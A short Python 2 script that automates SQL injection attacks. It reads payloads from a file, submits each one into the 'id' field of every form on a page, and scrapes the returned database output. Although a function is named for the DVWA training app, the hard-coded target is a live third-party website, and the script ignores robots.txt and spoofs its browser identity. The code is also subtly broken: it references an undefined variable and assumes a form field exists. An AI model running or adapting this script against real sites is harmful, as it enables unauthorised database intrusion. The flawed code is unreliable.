#!/usr/bin/env python

import sys
import mechanize
from bs4 import BeautifulSoup
import pprint


with open('sql_commands.txt', mode='r') as sqlFile:
    sqlInjectionList = sqlFile.read().splitlines() 
    
pprint.pprint(sqlInjectionList)

#Define Global Variables and Objects
browser = mechanize.Browser()

#browser.set_all_readonly(False)    # allow everything to be written to
browser.set_handle_robots(False)   # ignore robots.txt
browser.set_handle_refresh(False)  # can sometimes hang without this

#Follows refresh 0 but not hangs on refresh > 0
#alternatively you may want to switch off the refreshing with browser.set_handle_refresh(False)
browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

#set the browser headers
browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Ubuntu/9.10 Firefox/3.6.0')]




def dvwa_sqli(browser, nr=0):

    for sqli in sqlInjectionList:
        #select the first form
        browser.select_form(nr=nr)

        print "[+] Testing SQL Injection :%s" %sqli
        browser.form['id'] = sqli		

        response=browser.submit()
        htmlresult = response.read()

        #parse the results of the SQL Query with the BeatifulSoup	
        bs = BeautifulSoup(htmlresult, 'lxml')
        dbResults = bs.find_all('pre')

        for record in dbResults:
            print record
        print ('\n')
        
        

#define the urls
base_url = "https://www.w3schools.com/sql/sql_injection.asp"
browser.open(base_url )

nrCounter=0
#Print all forms found
for form in browser.forms():
    print "Form name:", form.name
    print form
    print form.attrs
    nrCounter=nrCounter+1
    
print "nr of forms: %s"%nr


for nr in xrange(0,nrCounter):
    dvwa_sqli(browser, nr=nr)